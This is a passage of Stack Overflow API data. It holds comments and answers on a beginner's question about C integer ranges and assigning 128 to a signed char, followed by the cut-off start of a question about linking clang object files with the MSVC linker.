"https://i.stack.imgur.com/XVXrx.jpg?s=128&g=1", "display_name": "Gurupad Mamadapur", "link": "https://stackoverflow.com/users/3225001/gurupad-mamadapur"}, "edited": false, "score": 3, "creation_date": 1476255108, "post_id": 39992128, "comment_id": 67262392, "body": "The value returned is -127 because overflow occured.Welcome to <code>stackOverflow</code> :)"}, {"owner": {"reputation": 1895, "user_id": 593248, "user_type": "registered", "accept_rate": 15, "profile_image": "https://i.stack.imgur.com/53J7M.png?s=128&g=1", "display_name": "Bhavdip Sagar", "link": "https://stackoverflow.com/users/593248/bhavdip-sagar"}, "edited": false, "score": 1, "creation_date": 1476255304, "post_id": 39992128, "comment_id": 67262489, "body": "I think the output would be the -128"}, {"owner": {"reputation": 5001, "user_id": 1182192, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/J6JgX.jpg?s=128&g=1", "display_name": "Abhineet", "link": "https://stackoverflow.com/users/1182192/abhineet"}, "edited": false, "score": 1, "creation_date": 1476256091, "post_id": 39992128, "comment_id": 67262954, "body": "<a href=\"http://ideone.com/RBGM3v\" rel=\"nofollow noreferrer\">ideone.com/RBGM3v</a>"}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 2, "creation_date": 1476256570, "post_id": 39992128, "comment_id": 67263205, "body": "Overflow in signed integer types results in undefined behaviour. See for example <a href=\"http://stackoverflow.com/questions/3948479/integer-overflow-and-undefined-behavior\" title=\"integer overflow and undefined behavior\">stackoverflow.com/questions/3948479/&hellip;</a>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1476258228, "post_id": 39992128, "comment_id": 67264144, "body": "Unlike Python, C assumes that you understand computers. The maximum value of a signed byte will be the same in your C program as it is in your CPU&#39;s instruction set. It is extremely likely that the CPU is using two&#39;s complement format, meaning that one byte can have values from -128 to +127. To fully understand these things, you need to first study binary number formats. Which as it turns out, is mandatory pre-requisite knowledge before studying programming."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "reply_to_user": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476259313, "post_id": 39992128, "comment_id": 67264763, "body": "@Paul R, I have Horton&#39;s fourth edition of c as a main reference, but the table somehow matches. The only difference is the int is also sub-divided into short and long int. Is that wrong?"}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "reply_to_user": {"reputation": 992, "user_id": 3225001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XVXrx.jpg?s=128&g=1", "display_name": "Gurupad Mamadapur", "link": "https://stackoverflow.com/users/3225001/gurupad-mamadapur"}, "edited": false, "score": 0, "creation_date": 1476259370, "post_id": 39992128, "comment_id": 67264797, "body": "@GurupadMamadapur, the compiler doesn&#39;t show an overflow error as it does when I enter(128*2)"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1476259445, "post_id": 39992128, "comment_id": 67264847, "body": "@BumbleBee: there are lots of bad books out there (Kantekar&#39;s books are by far the worst, but there are many other bad books too) - I suggest you pick a book from <a href=\"http://stackoverflow.com/q/562303/253056\">this list</a>. In the mean time you may find <a href=\"https://en.wikipedia.org/wiki/C_data_types\" rel=\"nofollow noreferrer\">this Wikipedia page</a> useful."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "reply_to_user": {"reputation": 5001, "user_id": 1182192, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/J6JgX.jpg?s=128&g=1", "display_name": "Abhineet", "link": "https://stackoverflow.com/users/1182192/abhineet"}, "edited": false, "score": 0, "creation_date": 1476259483, "post_id": 39992128, "comment_id": 67264869, "body": "@Abhineet, I frankly didn&#39;t understand this(sorry) but is that the output on some kind of an online compiler or something. Dev C++ doesn&#39;t really show that"}, {"owner": {"reputation": 992, "user_id": 3225001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XVXrx.jpg?s=128&g=1", "display_name": "Gurupad Mamadapur", "link": "https://stackoverflow.com/users/3225001/gurupad-mamadapur"}, "edited": false, "score": 0, "creation_date": 1476259646, "post_id": 39992128, "comment_id": 67264983, "body": "@BumbleBee it&#39;s not a compiler error, I never said it was. It is an undefined behaviour occurring due to the overflow."}, {"owner": {"reputation": 5001, "user_id": 1182192, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/J6JgX.jpg?s=128&g=1", "display_name": "Abhineet", "link": "https://stackoverflow.com/users/1182192/abhineet"}, "edited": false, "score": 0, "creation_date": 1476259659, "post_id": 39992128, "comment_id": 67264993, "body": "@BumbleBee - Yeah, IdeOne is one of the online IDE. The basic point is, you are experiencing Undefined Behavior which of course can&#39;t be defined as per C standards."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476259897, "post_id": 39992128, "comment_id": 67265150, "body": "@Lundin, Binary number format? I&#39;m aware of binary number system which comes as a included course(basic level) in high school mathematics. Is this what you meant? and Is this knowledge sufficient? If not then how can I learn more about it?"}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "reply_to_user": {"reputation": 5001, "user_id": 1182192, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/J6JgX.jpg?s=128&g=1", "display_name": "Abhineet", "link": "https://stackoverflow.com/users/1182192/abhineet"}, "edited": false, "score": 0, "creation_date": 1476259949, "post_id": 39992128, "comment_id": 67265182, "body": "@Abhineet, it&#39;s something like infinity? It&#39;s not there yet it&#39;s not false?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476260189, "post_id": 39992128, "comment_id": 67265305, "body": "@BumbleBee <a href=\"https://en.wikipedia.org/wiki/Two%27s_complement\" rel=\"nofollow noreferrer\">Two&#39;s complement</a>."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 1, "creation_date": 1476260542, "post_id": 39992128, "comment_id": 67265490, "body": "@KlasLindb&#228;ck There is no integer overflow in the example. This is pretty obvious, as the only modification is an implicit conversion."}, {"owner": {"reputation": 5001, "user_id": 1182192, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/J6JgX.jpg?s=128&g=1", "display_name": "Abhineet", "link": "https://stackoverflow.com/users/1182192/abhineet"}, "edited": false, "score": 0, "creation_date": 1476266006, "post_id": 39992128, "comment_id": 67269029, "body": "See my edits in solution"}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1476272980, "post_id": 39992128, "comment_id": 67273449, "body": "@2501 (checking...) You are correct. The behaviour is implementation defined, not undefined. I stand corrected.  <a href=\"http://stackoverflow.com/a/18294422/646887\">stackoverflow.com/a/18294422/646887</a>"}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476275579, "post_id": 39992128, "comment_id": 67275052, "body": "I&#39;m not sure now, I don&#39;t know what the actual problem is, undefined or implementation defined, (I don&#39;t know what latter means though I have a subtle idea of what former is.)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 992, "user_id": 3225001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XVXrx.jpg?s=128&g=1", "display_name": "Gurupad Mamadapur", "link": "https://stackoverflow.com/users/3225001/gurupad-mamadapur"}, "edited": false, "score": 0, "creation_date": 1476282663, "post_id": 39992128, "comment_id": 67280292, "body": "@GurupadMamadapur Disagree with <a href=\"http://stackoverflow.com/questions/39992128/range-of-values-in-c/40001084#comment67262392_39992128\">overflow occured</a>.  There is no math to overflow.  The issue is conversion as detailed in my answer.  Of course OF and conversion are related concerns.  The is no UB, just ID behavior."}], "answers": [{"tags": [], "owner": {"reputation": 1895, "user_id": 593248, "user_type": "registered", "accept_rate": 15, "profile_image": "https://i.stack.imgur.com/53J7M.png?s=128&g=1", "display_name": "Bhavdip Sagar", "link": "https://stackoverflow.com/users/593248/bhavdip-sagar"}, "is_accepted": false, "score": 0, "last_activity_date": 1476256814, "creation_date": 1476256814, "answer_id": 39992699, "question_id": 39992128, "link": "https://stackoverflow.com/questions/39992128/range-of-values-in-c/39992699#39992699", "title": "Range of values in C", "body": "<p>What I think that, In ones' complement encoding (which is not very common nowadays, but in the olden days, it was), there were separate values for +0 and -0, and so the range for an 8-bit quantity is -127 to +127.</p>\n\n<p>But in the processors that having two's complement representation (which is rather common), the minimum value will almost certainly be -128 in both languages C and C++. The reason why you only -127 is guaranteed, is because it allows a non two's complement representation to be supported.</p>\n\n<p>That is because of the way two's complement encoding works: 0 is treated as a \"positive\" number (signed bit off), so, therefore, the number of available positive values is reduced by one. </p>\n\n<p>You can find the range value that state into the char class as constants.That probably return the exact correct range that supported by the system.</p>\n\n<p>Thanks</p>\n"}, {"comments": [{"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 1, "creation_date": 1476323749, "post_id": 40001084, "comment_id": 67300058, "body": "&quot;See C11 &#167;5.2.4.2.1 1&quot;, what is this?"}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476587654, "post_id": 40001084, "comment_id": 67406720, "body": "@chux, do you mean -128 is the result of two&#39;s complement? How can we use two&#39;s complement to get this?"}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476589369, "post_id": 40001084, "comment_id": 67406963, "body": "@chux, in the type of int entering a value of 2147438648 does not bring out the result -2147438648, I am not understanding this point"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476595037, "post_id": 40001084, "comment_id": 67407851, "body": "@BumbleBee &quot;mean -128 is the result of two&#39;s complement?&quot; --&gt; yes.  <i>We</i> do not use 2&#39;s complement to get this - it is the other way around.  We use <code>SCHAR_MIN --&gt; -128</code> to deduce the implementation  has made that choice to use 8-bit 2&#39;s complement - a very common choice."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476595319, "post_id": 40001084, "comment_id": 67407914, "body": "@chux, why isn&#39;t this choice made for the type int like I have pointed above?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476595323, "post_id": 40001084, "comment_id": 67407915, "body": "@BumbleBee &quot;the type of int entering a value of 2147438648 does not bring out the result -2147438648&quot; --&gt; I do not see 2147438648 in your post or comments.  Note that <code>2147438648</code> is outside the range, by 1, of a 32-bit <code>int</code>.  What type do you think <code>2147438648</code> is?"}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476597203, "post_id": 40001084, "comment_id": 67408308, "body": "@chux, it is definitely an integer, yes, but it is also a signed integer, which according to my &#39;beginner&#39;(small) understanding would range to positive from 2147438647 and negetive to 4294877294, but there is an error(found experimentally) once 4294877294 is assigned to a variable."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476597351, "post_id": 40001084, "comment_id": 67408334, "body": "@chux, in dr. math&#39;s forum it has been pointed out that for signed char, value from 0 to 127 would be positive and beginning from 128 to 255 would be negetive, which would explain my question and the value of 2&#39;s complement agrees that 128= -128=(10000000)base2, but the same does not imply for (signed)ints? I&#39;m really confused in this(for 2-3 stuck on the same page)."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476598448, "post_id": 40001084, "comment_id": 67408516, "body": "@BumbleBee, &quot;it is definitely an integer&quot; does not clearly express a type like <code>char</code>, <code>int</code>, <code>short</code>, <code>long</code> or <code>long long</code>, etc.  When <code>int</code> is 32-bit, <code>2147438648</code> is not type <code>int</code>.  It is <code>long</code> or <code>long long</code>.  A 32-bit <code>int</code> ( I did not say &quot;integer&quot;) ranges from -(2&#179;&#185;) to (2&#179;&#185; - 1).  2147438648 is outside that range.  IAC, post/comment about the code that uses 2147438648 as it is missing.  Other forum sites are best discussed there.  &quot;for signed char, value from ... 128 to 255 would be negative&quot; is unclear.  Post code that shows what you are commenting."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476605997, "post_id": 40001084, "comment_id": 67410004, "body": "@chux, it is a long long int (2147438648) but in the same code in my question above why would not the code produce any errors or negate our value to -2147438647 if we replace &quot;signed char&quot; with &quot;int&quot; and the value of variable1 with 2147438648?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1476631018, "post_id": 40001084, "comment_id": 67417047, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/125841/discussion-between-chux-and-bumblebee\">continue this discussion in chat</a>."}, {"owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "edited": false, "score": 0, "creation_date": 1477359635, "post_id": 40001084, "comment_id": 67723199, "body": "@chux, how do we obtain the range of -3.403E38 on screen, doesn&#39;t seem that FLT_MIN does it."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1477360036, "post_id": 40001084, "comment_id": 67723297, "body": "<code>printf(&quot;%e\\n&quot;, -FLT_MAX);</code>  Aside from <i>maybe</i> 0.0, every FP value a negative  counterpart."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1476283880, "last_edit_date": 1592644375, "creation_date": 1476282097, "answer_id": 40001084, "question_id": 39992128, "link": "https://stackoverflow.com/questions/39992128/range-of-values-in-c/40001084#40001084", "title": "Range of values in C", "body": "<p>&quot;Range of values in C&quot; is a broad topic.  Just talking about integer ranges, a 1 bit integer field may have a narrow range of 0 to 1 or (-1 to 0).  <code>intmax_t/uintmax_t</code> deals with numbers in the 64-bit range or more.  The range limitations and conversion amongst the many integer types in C is the tricky bit.</p>\n<hr />\n<p>To focus on OP's example:<br />\nIn the below, <code>128</code> is an <em>integer constant</em> with the value of 128 and type of <code>int</code>.</p>\n<pre><code>signed char variable1;\nvariable1 = 128;\n</code></pre>\n<p><code>signed char</code> has a range is <code>SCHAR_MIN</code> to <code>SCHAR_MAX</code>.  This is typically -128 to 127 and could be as small as  -127 to 127.  (See C11 \u00a75.2.4.2.1 1)</p>\n<p>The assignment needs to convert an <code>int </code>to <code>signed char</code> and the following applies per the assumed <code>signed char</code> range: (My emphasis)</p>\n<blockquote>\n<p>When a value with integer type is converted to another integer type other than <code>_Bool</code>, if the value can be represented by the new type, it is unchanged. C11dr \u00a76.3.1.3 1</p>\n<p>Otherwise, the new type is signed <strong>and the value cannot be represented</strong> in it; either the <strong>result is implementation-defined</strong> or an implementation-defined signal is raised. C11dr \u00a76.3.1.3 3</p>\n</blockquote>\n<p>A typical implementation defined result is a 2's complement wrap-around, so a value of -128 is common.  OP's platform did something different and gave it the value of -127.  It is <em>implementation-defined</em> behavior.  <a href=\"https://stackoverflow.com/questions/39992128/range-of-values-in-c/40001084#comment67265490_39992128\">@2501</a></p>\n<hr />\n<p>Not sure that &quot;The output of the compiler(using dev C++) was :  -127&quot; implies OP was correctly using a <em>C</em> compiler.  OP should insure that.</p>\n"}], "owner": {"reputation": 105, "user_id": 6772980, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/407a48cec05b78a7152f85ac97053d70?s=128&d=identicon&r=PG&f=1", "display_name": "BumbleBee", "link": "https://stackoverflow.com/users/6772980/bumblebee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1874, "favorite_count": 1, "accepted_answer_id": 40001084, "answer_count": 2, "score": 3, "last_activity_date": 1476678766, "creation_date": 1476254824, "last_edit_date": 1476326384, "question_id": 39992128, "link": "https://stackoverflow.com/questions/39992128/range-of-values-in-c", "title": "Range of values in C", "body": "<p>I've never come across such variable types in python(even though I am still a beginner in python and have just started C).  </p>\n\n<p>I've come across variable types in C and am confused at the point where the range of values are given like <a href=\"https://www.google.com.np/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwiO4KmLzdTPAhUMMY8KHdDpCfoQFggcMAE&amp;url=https%3A%2F%2Fwww.tutorialspoint.com%2Fcprogramming%2Fc_data_types.htm&amp;usg=AFQjCNEmB9j0Ve5ELJk6QORrn3LCKOAp8w&amp;bvm=bv.135475266,d.c2I\" rel=\"nofollow\">this.</a> I've made the following deductions:  </p>\n\n<ul>\n<li><p>The storage size is the amount of space that the specific type of variable can hold. But regarding the value range I have a lot of doubts:  </p></li>\n<li><p>I think the value range is the integer upto which we can enter into the specific variable:  </p></li>\n</ul>\n\n<p><strong>Example:</strong> </p>\n\n<p>I think for signed char the storage size is 1 byte and we could not enter variable1 = 128, but I was wrong when I compiled the simple program;  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void)\n{\n  signed char variable1;\n  variable1 = 128;\n  printf(\"the value is: %d\", variable1);\n  return 0;\n}  \nThe output of the compiler(using dev C++) was :  \n  -127  \n</code></pre>\n\n<p>So I thought It would start from the minimum once it crossed it's range and produce an error after 255 and I was right. The same was true for the type short int from type -32,768 to 32,767. But, this failed for the type int -2,147,483,648 to 2,147,483,647. It continued to accent.  </p>\n\n<p>Therefore, my whole perspective about the value ranges went to nought. It might be something more complex than I had imagined. So what is the value range of variables, and how can we interpret all of these weird results?  </p>\n\n<p>EDIT1:  I edited to upload my experiments:  </p>\n\n<p><a href=\"https://i.stack.imgur.com/r3Q54.png\" rel=\"nofollow\">experiments</a></p>\n"}, {"tags": ["c", "visual-c++", "linker", "llvm-clang"], "comments": [{"owner": {"reputation": 11436, "user_id": 89706, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7484b466a474ebffc58e91bc5aa7e892?s=128&d=identicon&r=PG", "display_name": "Ofek Shilon", "link": "https://stackoverflow.com/users/89706/ofek-shilon"}, "edited": false, "score": 0, "creation_date": 1476342514, "post_id": 39991963, "comment_id": 67306192, "body": "Was hello.obj compiled with /MT?"}, {"owner": {"reputation": 1543, "user_id": 6947337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bdf5002789a65c778f9f20c5bfa8efee?s=128&d=identicon&r=PG&f=1", "display_name": "rlee827", "link": "https://stackoverflow.com/users/6947337/rlee827"}, "reply_to_user": {"reputation": 11436, "user_id": 89706, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7484b466a474ebffc58e91bc5aa7e892?s=128&d=identicon&r=PG", "display_name": "Ofek Shilon", "link": "https://stackoverflow.com/users/89706/ofek-shilon"}, "edited": false, "score": 0, "creation_date": 1476387715, "post_id": 39991963, "comment_id": 67336375, "body": "I am relatively new to C, so I am not sure. I simply ran <code>clang -c hello.c -emit-llvm -o hello.bc</code> followed by <code>llc -filetype-obj hello.bc</code> before invoking the linker. What does <code>&#47;MT</code> do for <code>cl</code>, and what would be its equivalent for <code>clang</code>?"}, {"owner": {"reputation": 11436, "user_id": 89706, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7484b466a474ebffc58e91bc5aa7e892?s=128&d=identicon&r=PG", "display_name": "Ofek Shilon", "link": "https://stackoverflow.com/users/89706/ofek-shilon"}, "edited": false, "score": 0, "creation_date": 1476388296, "post_id": 39991963, "comment_id": 67336683, "body": "in VC, /MT specifies linkage to the static version of the CRT. The clang equivalent is -static:  <a href=\"http://stackoverflow.com/questions/34411995/static-link-libstdc-using-clang\" title=\"static link libstdc using clang\">stackoverflow.com/questions/34411995/&hellip;</a>.     Generally speaking, static linkage to the CRT should have a good reason - it is widely accepted that dynamic linking is preferred (if only for the sake of maintainability by the library vendor)"}, {"owner": {"reputation": 1543, "user_id": 6947337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bdf5002789a65c778f9f20c5bfa8efee?s=128&d=identicon&r=PG&f=1", "display_name": "rlee827", "link": "https://stackoverflow.com/users/6947337/rlee827"}, "reply_to_user": {"reputation": 11436, "user_id": 89706, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/7484b466a474ebffc58e91bc5aa7e892?s=128&d=identicon&r=PG", "display_name": "Ofek Shilon", "link": "https://stackoverflow.com/users/89706/ofek-shilon"}, "edited": false, "score": 0, "creation_date": 1476407041, "post_id": 39991963, "comment_id": 67343761, "body": "When I created the <code>.obj</code> file, I just used whatever the default was for <code>clang</code>. How should I point <code>clang</code> or the other programs of the LLVM suite towards the CRT so that I can use <code>link</code> to link dynamically? The guide seems to say that <code>clang hello.c -o hello.exe</code> should be enough, but it still fails at the linking step."}], "owner": {"reputation": 1543, "user_id": 6947337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bdf5002789a65c778f9f20c5bfa8efee?s=128&d=identicon&r=PG&f=1", "display_name": "rlee827", "link": "https://stackoverflow.com/users/6947337/rlee827"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 595, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1476254173, "creation_date": 1476254173, "question_id": 39991963, "link": "https://stackoverflow.com/questions/39991963/c-unable-to-use-msvc-linker-to-link-obj-files-from-the-command-line", "title": "C - Unable to use MSVC linker to link .obj files from the command line", "body": "<p>I have been trying to follow the instructions at <a href=\"http://llvm.org/docs/GettingStartedVS.html#an-example-using-the-llvm-tool-chain\" rel=\"nofollow\">http://llvm.org/docs/GettingStartedVS.html#an-example-using-the-llvm-tool-chain</a>, but I run into errors at the linking stage. For some reason, I can compile the \"hello world\" program all the way to an <code>.exe</code> inside the Visual Studio GUI, but when I run the compiler (either <code>clang</code> or 